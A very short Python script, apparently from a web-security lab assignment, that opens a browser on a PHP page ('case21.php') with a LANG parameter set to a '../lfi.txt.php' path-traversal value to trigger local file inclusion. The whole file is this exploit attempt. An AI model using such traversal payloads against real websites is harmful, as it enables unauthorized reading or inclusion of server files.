import webbrowser

url = "http://www.wsb.com/Assignment2/case21.php?LANG=../lfi.txt.php"
new = 2
webbrowser.open(url, new)

# ONLY WORKS WITH LOCAL FILE INCLUSION